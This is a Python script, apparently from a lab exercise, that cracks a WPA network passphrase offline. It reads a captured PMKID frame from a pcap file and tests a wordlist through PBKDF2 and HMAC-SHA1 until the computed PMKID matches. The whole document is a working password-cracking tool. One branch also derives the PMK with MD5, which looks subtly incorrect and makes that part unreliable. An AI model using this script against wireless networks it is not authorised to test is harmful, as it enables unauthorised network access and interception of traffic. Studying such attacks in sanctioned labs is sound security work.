import hashlib
import hmac
from binascii import a2b_hex
from itertools import islice

from pbkdf2 import *

from scapy.all import *

if __name__ == '__main__':
    wpa = rdpcap("PMKID_handshake.pcap")
    A = "Pairwise key expansion"
    f = open("wordlist")
    ssid = wpa[144].info.decode("utf-8")
    pmkid = raw(wpa[145])[0xc1:0xd1]
    APmac = a2b_hex(wpa[145].addr2.replace(":", ""))
    Clientmac = a2b_hex(wpa[145].addr1.replace(":", ""))
    md5 = raw(wpa[145])[0x5e]
    '''
    ANonce = wpa[5].getlayer(WPA_key).nonce
    SNonce = raw(wpa[6])[65:-72]
    data = raw(wpa[8])[0x30:0x81] + b"\x00" * 16 + raw(wpa[8])[0x91:0x93]
    md5 = raw(wpa[8])[0x36]
    '''

    ssid = str.encode(ssid)
    for line in f:
        line = line.replace("\r", "")
        line = line.replace("\n", "")
        passPhrase = str.encode(line)
        pmk = b""

        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        if md5 & 0x1 == 0x1:
            pmk = pbkdf2(hashlib.md5, passPhrase, ssid, 4096, 32)
        else:
            pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
        iscorrectPmk = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK

        if iscorrectPmk.digest()[0:16] == pmkid:
            print("passphrase found ! : ", line)
            break
        print("passphrase tested  : ", line)
    f.close()
